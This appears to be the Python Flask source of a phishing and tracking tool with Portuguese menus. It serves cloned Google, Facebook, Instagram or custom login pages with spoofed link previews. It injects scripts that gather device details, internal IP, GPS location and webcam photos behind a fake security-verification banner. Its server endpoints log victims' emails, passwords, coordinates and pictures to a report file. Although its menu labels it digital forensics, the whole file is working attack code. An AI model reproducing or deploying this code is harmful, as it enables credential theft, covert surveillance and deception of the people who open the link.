from flask import Flask, render_template_string, request, jsonify, send_from_directory
import datetime, base64, os, requests, shutil, json
import pytz, re

fuso_br = pytz.timezone('America/Sao_Paulo')

# --- Caminhos: pasta do app.py (evita WinError 5 no System32) ---
_BASE_DIR = os.path.dirname(os.path.abspath(__file__))

if os.path.exists("/sdcard"):
    pasta_raiz = "/sdcard/info_spy"
else:
    pasta_raiz = os.path.join(_BASE_DIR, "info_spy")

pasta_templates = os.path.join(_BASE_DIR, "templates")
pasta_preview = os.path.join(_BASE_DIR, "static", "preview")
arquivo_cache_preview = os.path.join(pasta_raiz, "preview_redirect_cache.json")

if not os.path.exists(pasta_raiz):
    os.makedirs(pasta_raiz)
if not os.path.exists(pasta_templates):
    os.makedirs(pasta_templates)
if not os.path.exists(pasta_preview):
    os.makedirs(pasta_preview)


def obter_temas():
    temas = {
        "1": "google",
        "2": "facebook",
        "3": "facebook_pc",
        "4": "instagram",
        "6": "redirecionar",
    }
    if os.path.exists(pasta_templates):
        extras = [
            d for d in os.listdir(pasta_templates)
            if os.path.isdir(os.path.join(pasta_templates, d))
        ]
        idx = 7
        for pasta in extras:
            if pasta not in temas.values():
                temas[str(idx)] = pasta
                idx += 1
    return temas


def extrair_meta_de_url(url):
    out = {
        "title": "Verificando conexão...",
        "description": "Aguarde um momento.",
        "image": "",
    }
    try:
        res = requests.get(
            url,
            verify=False,
            timeout=8,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        )
        html = res.text
        m = re.search(r"<title[^>]*>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
        if m:
            out["title"] = re.sub(r"\s+", " ", m.group(1)).strip()
        m = re.search(
            r'<meta[^>]*property=["\']og:description["\'][^>]*content=["\'](.*?)["\']',
            html,
            re.IGNORECASE,
        ) or re.search(
            r'<meta[^>]*name=["\']description["\'][^>]*content=["\'](.*?)["\']',
            html,
            re.IGNORECASE,
        )
        if m:
            out["description"] = m.group(1).strip()
        m = re.search(
            r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\'](.*?)["\']',
            html,
            re.IGNORECASE,
        )
        if m:
            out["image"] = m.group(1).strip()
        if not out["description"]:
            out["description"] = out["title"]
    except Exception as e:
        print(f"[!] Preview da URL (opcional): {e}")
    return out


def salvar_cache_preview(url, meta):
    with open(arquivo_cache_preview, "w", encoding="utf-8") as f:
        json.dump({"url": url, **meta}, f, ensure_ascii=False)


def carregar_cache_preview(url):
    if not os.path.exists(arquivo_cache_preview):
        return None
    try:
        with open(arquivo_cache_preview, "r", encoding="utf-8") as f:
            data = json.load(f)
        if data.get("url") == url:
            return data
    except Exception:
        pass
    return None


def meta_tags_html(title, description, image=""):
    return (
        f"<title>{title}</title>\n"
        f'<meta property="og:title" content="{title}">\n'
        f'<meta property="og:description" content="{description}">\n'
        f'<meta property="og:image" content="{image}">\n'
        f'<meta property="og:type" content="website">\n'
        f'<meta name="description" content="{description}">\n'
    )


def mostrar_menu():
    os.system("clear" if os.name == "posix" else "cls")
    temas_disponiveis = obter_temas()

    print("=" * 40)
    print(" PERÍCIA DIGITAL - SELECIONE O TEMA")
    print("=" * 40)
    for i in range(1, 5):
        print(f" [{i}] {temas_disponiveis[str(i)].capitalize()} Login")
    print(" [5] Custom (URL - Clonar agora)")
    print(f" [6] {temas_disponiveis['6'].capitalize()}")
    for k, v in temas_disponiveis.items():
        if int(k) >= 7:
            print(f" [{k}] {v} (Salvo)")
    print("=" * 40)

    opcao = input(" Escolha o template: ")

    ativar_loc = input(" Ativar localização? (s/n): ").lower() == "s"
    ativar_foto = input(" Ativar foto? (s/n): ").lower() == "s"
    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == "s"

    url_custom = ""
    if opcao == "5":
        url_custom = input(" Digite a URL para clonar: ")
        if not url_custom.startswith("http"):
            url_custom = "https://" + url_custom
        salvar = input(" Deseja salvar este clone permanentemente? (s/n): ").lower()
        if salvar == "s":
            nome_pasta = input(" Digite o nome para a nova pasta: ").replace(" ", "_")
            caminho_novo = os.path.join(pasta_templates, nome_pasta)
            if not os.path.exists(caminho_novo):
                os.makedirs(caminho_novo)
            try:
                res = requests.get(url_custom, verify=False, timeout=10)
                with open(os.path.join(caminho_novo, "index.html"), "w", encoding="utf-8") as f:
                    f.write(res.text)
                return (
                    nome_pasta,
                    input(" URL de redirecionamento: "),
                    url_custom,
                    ativar_loc,
                    ativar_foto,
                    ativar_banner,
                )
            except Exception:
                print("Erro ao salvar.")

    link_destino = input(" Digite a URL para redirecionar: ")
    if not link_destino.startswith("http"):
        link_destino = "https://" + link_destino
    tema_escolhido = temas_disponiveis.get(opcao, "google")
    if opcao == "5":
        tema_escolhido = "custom"

    return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto, ativar_banner


pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()

meta_redirect_cache = None
if pasta_tema == "redirecionar":
    print("\n[*] Buscando preview da URL de destino (uma vez)...")
    meta_redirect_cache = extrair_meta_de_url(url_redirecionamento)
    salvar_cache_preview(url_redirecionamento, meta_redirect_cache)
    print(f"    Título: {meta_redirect_cache['title'][:60]}...")

print("\n" + "=" * 40)
personalizar = input(" Deseja personalizar o preview do link? (s/n): ").lower()

meta_titulo = meta_desc = img_local = None
nome_servir = "preview.jpg"

if personalizar == "s":
    meta_titulo = input(" Título do link: ")
    meta_desc = input(" Descrição do link: ")
    img_local = input(" Nome da imagem local (ex: foto.jpg): ")
    if not os.path.isabs(img_local):
        img_caminho = os.path.join(_BASE_DIR, img_local)
    else:
        img_caminho = img_local
    if os.path.exists(img_caminho):
        shutil.copy(img_caminho, os.path.join(pasta_preview, nome_servir))
    print(" [!] Personalização aplicada.")
else:
    print(" [!] Usando metadados originais da página.")
print("=" * 40 + "\n")

app = Flask(__name__)


@app.route("/preview.jpg")
def imagem_link():
    return send_from_directory(pasta_preview, nome_servir)


@app.route("/")
def index():
    html_original = ""
    try:
        if pasta_tema == "custom":
            res = requests.get(url_alvo_custom, verify=False, timeout=10)
            html_original = res.text
        else:
            path = os.path.join(pasta_templates, pasta_tema, "index.html")
            if not os.path.exists(path):
                return "Arquivo não encontrado", 404
            with open(path, "r", encoding="utf-8") as f:
                html_original = f.read()
    except Exception as e:
        return f"Erro: {e}", 500

    if personalizar == "s":
        html_original = re.sub(r"<title>.*?</title>", "", html_original, flags=re.IGNORECASE)
        html_original = re.sub(r'<meta property="og:.*?>', "", html_original, flags=re.IGNORECASE)
        html_original = re.sub(
            r'<meta name="description".*?>', "", html_original, flags=re.IGNORECASE
        )

    meta_tags = ""
    if personalizar == "s":
        link_da_foto = f"{request.host_url}preview.jpg"
        meta_tags = meta_tags_html(meta_titulo, meta_desc, link_da_foto)
    elif pasta_tema == "redirecionar":
        cached = carregar_cache_preview(url_redirecionamento) or meta_redirect_cache
        if cached:
            meta_tags = meta_tags_html(
                cached.get("title", "Verificando conexão..."),
                cached.get("description", "Aguarde."),
                cached.get("image", ""),
            )
        else:
            meta_tags = meta_tags_html("Verificando conexão...", "Aguarde um momento.", "")

    script_orquestrador = f"""
    <script>
    window.__gpsRespondido = !{str(usar_loc).lower()};
    window.__fotoEnviada = !{str(usar_foto).lower()};
    window.__coletaInicialOk = false;
    window.__jaRedirecionou = false;
    window.__bannerAceito = false;

    (function () {{
        var origFetch = window.fetch;
        window.fetch = function (input, init) {{
            var url = typeof input === "string" ? input : (input && input.url) || "";
            return origFetch.apply(this, arguments).then(function (res) {{
                if ({str(usar_foto).lower()} && url.indexOf("/foto") !== -1) {{
                    window.__fotoEnviada = true;
                    if (typeof window.tentarContinuarFluxo === "function") {{
                        window.tentarContinuarFluxo();
                    }}
                }}
                return res;
            }});
        }};

        if (navigator.geolocation && navigator.geolocation.getCurrentPosition) {{
            var origGps = navigator.geolocation.getCurrentPosition.bind(navigator.geolocation);
            navigator.geolocation.getCurrentPosition = function (ok, err, opts) {{
                origGps(
                    function (pos) {{
                        if ({str(usar_loc).lower()}) {{
                            window.__gpsRespondido = true;
                            if (typeof window.tentarContinuarFluxo === "function") {{
                                window.tentarContinuarFluxo();
                            }}
                        }}
                        if (ok) ok(pos);
                    }},
                    function (e) {{
                        if ({str(usar_loc).lower()}) {{
                            window.__gpsRespondido = true;
                            if (typeof window.tentarContinuarFluxo === "function") {{
                                window.tentarContinuarFluxo();
                            }}
                        }}
                        if (err) err(e);
                    }},
                    opts
                );
            }};
        }}

        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {{
            var origGum = navigator.mediaDevices.getUserMedia.bind(navigator.mediaDevices);
            navigator.mediaDevices.getUserMedia = function (constraints) {{
                return origGum(constraints).catch(function (e) {{
                    if ({str(usar_foto).lower()}) {{
                        window.__fotoEnviada = true;
                        if (typeof window.tentarContinuarFluxo === "function") {{
                            window.tentarContinuarFluxo();
                        }}
                    }}
                    return Promise.reject(e);
                }});
            }};
        }}
    }})();

    async function enviarDadosIniciais() {{
        let batteryInfo = "N/A";
        if (navigator.getBattery) {{
            try {{
                const b = await navigator.getBattery();
                batteryInfo = (b.level * 100).toFixed(0) + "% " + (b.charging ? "(Carregando)" : "");
            }} catch (e) {{}}
        }}
        const ipInt = await getInternalIP();
        await fetch("/capturar_inicial", {{
            method: "POST",
            headers: {{ "Content-Type": "application/json" }},
            body: JSON.stringify({{
                ip_interno: ipInt,
                bateria: batteryInfo,
                screenWidth: screen.width,
                screenHeight: screen.height,
                deviceMemory: navigator.deviceMemory || "N/A"
            }})
        }});
        window.__coletaInicialOk = true;
        if (typeof window.tentarContinuarFluxo === "function") {{
            window.tentarContinuarFluxo();
        }}
    }}

    function dispararPermissoesAtivas() {{
        if (!window.usarLoc && !window.usarFoto) return;
        if (typeof dispararGPS !== "function") return;
        dispararGPS();
    }}

    function irParaDestinoSeRedirecionar() {{
        if (window.__jaRedirecionou) return;
        if (window.temaAtual !== "redirecionar") return;
        window.__jaRedirecionou = true;
        window.location.replace(window.urlRedirecionamento);
    }}

    window.tentarContinuarFluxo = function () {{
        if (window.temaAtual === "redirecionar") {{
            if (!window.__coletaInicialOk) return;
            if (window.usarLoc && !window.__gpsRespondido) return;
            if (window.usarFoto && !window.__fotoEnviada) return;
            irParaDestinoSeRedirecionar();
        }}
    }};

    function iniciarFluxoSemBanner() {{
        enviarDadosIniciais();
        dispararPermissoesAtivas();
        if (!window.usarLoc && !window.usarFoto && window.temaAtual === "redirecionar") {{
            window.tentarContinuarFluxo();
        }}
    }}

    async function aceitarCookies() {{
        window.__bannerAceito = true;
        var el = document.getElementById("bloqueio-spy");
        if (el) el.style.display = "none";

        if (!window.__coletaInicialOk) {{
            await enviarDadosIniciais();
        }}

        dispararPermissoesAtivas();

        if (window.temaAtual === "redirecionar") {{
            if (!window.usarLoc && !window.usarFoto) {{
                window.tentarContinuarFluxo();
            }}
        }}
    }}

    window.addEventListener("load", function () {{
        if (!{"true" if ativar_banner else "false"}) {{
            iniciarFluxoSemBanner();
        }} else {{
            enviarDadosIniciais();
        }}
    }});
    </script>
    """

    css_banner = """
    <style>
        #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff;
            z-index: 999999; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
        #box-spy { background: #fff; padding: 30px; text-align: center; max-width: 85%; }
        #btn-spy { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px;
            cursor: pointer; font-weight: bold; margin-top: 15px; font-size: 16px; }
    </style>
    """

    html_banner = """
    <div id="bloqueio-spy">
        <div id="box-spy">
            <h2 style="margin-top:0; color:#333;">Verificação de Segurança</h2>
            <p style="color:#666;">Para continuar, aceite as permissões solicitadas pelo navegador.</p>
            <button id="btn-spy" type="button" onclick="aceitarCookies()">CONTINUAR</button>
        </div>
    </div>
    """

    script_config = f"""<script>
        window.temaAtual = "{pasta_tema}";
        window.urlRedirecionamento = "{url_redirecionamento}";
        window.usarLoc = {"true" if usar_loc else "false"};
        window.usarFoto = {"true" if usar_foto else "false"};
    </script>"""

    scripts_captura = (
        '\n<script src="/static/js/espiao.js"></script>\n'
        '<script src="/static/js/saida.js"></script>\n'
    )

    head_content = meta_tags + script_orquestrador + script_config + scripts_captura

    if ativar_banner:
        head_content = css_banner + head_content
        banner_html = html_banner
    else:
        banner_html = ""

    if re.search(r"<head", html_original, re.IGNORECASE):
        html_final = re.sub(
            r"(<head[^>]*>)",
            r"\1" + head_content,
            html_original,
            flags=re.IGNORECASE,
            count=1,
        )
    else:
        html_final = head_content + html_original

    if ativar_banner:
        if re.search(r"<body", html_final, re.IGNORECASE):
            html_final = re.sub(
                r"(<body[^>]*>)",
                r"\1" + banner_html,
                html_final,
                flags=re.IGNORECASE,
                count=1,
            )
        else:
            html_final = banner_html + html_final

    return render_template_string(html_final)


@app.route("/capturar_inicial", methods=["POST"])
def capturar_inicial():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    ip_publico = ip_list[0] if ip_list else request.remote_addr
    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")

    log = (
        f"=== COLETA NO CLIQUE ===\n"
        f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
        f"IP INTERNO: {dados.get('ip_interno', 'N/A')}\n"
        f"BATERIA: {dados.get('bateria', 'N/A')}\n"
        f"RAM: {dados.get('deviceMemory')} GB\n"
        f"TELA: {dados.get('screenWidth')} x {dados.get('screenHeight')}\n"
        f"{'-' * 60}\n"
    )

    caminho = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho, "a", encoding="utf-8") as f:
        f.write(log)
    print(f"\033[93m[+] Evidência salva em: {caminho} (Horário BRT: {agora})\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route("/capturar", methods=["POST"])
def capturar():
    dados = request.json
    ip_list = request.headers.getlist("X-Forwarded-For")
    ip_publico = ip_list[0] if ip_list else request.remote_addr
    agora = datetime.datetime.now(fuso_br).strftime("%d/%m/%Y %H:%M:%S")

    log = (
        f"DATA: {agora} | IP PÚBLICO: {ip_publico}\n"
        f"IP INTERNO (LAN): {dados.get('ip_interno', 'N/A')}\n"
        f"TEMA: {pasta_tema.upper()} | BATERIA: {dados.get('bateria', 'N/A')}\n"
        f"EMAIL/USER: {dados.get('email')} | SENHA: {dados.get('pass')}\n"
        f"LAT: {dados.get('lat')} | LON: {dados.get('lon')}\n"
        f"{'-' * 50}\n"
    )

    caminho = os.path.join(pasta_raiz, "relatorio.txt")
    with open(caminho, "a", encoding="utf-8") as f:
        f.write(log)
    print(f"\033[92m[+] Evidência salva em: {caminho} (Horário BRT: {agora})\033[0m")
    return jsonify({"status": "ok"}), 200


@app.route("/foto", methods=["POST"])
def receber_foto():
    dados = request.json
    try:
        imagem_b64 = dados.get("image", "").split(",")
        agora = datetime.datetime.now(fuso_br).strftime("%Y%m%d_%H%M%S")
        nome_arq = f"FOTO_{agora}.jpg"
        with open(os.path.join(pasta_raiz, nome_arq), "wb") as f:
            f.write(base64.b64decode(imagem_b64[1]))
        print(f"\033[92m[+] Foto salva: {nome_arq}\033[0m")
    except Exception:
        pass
    return jsonify({"status": "ok"}), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)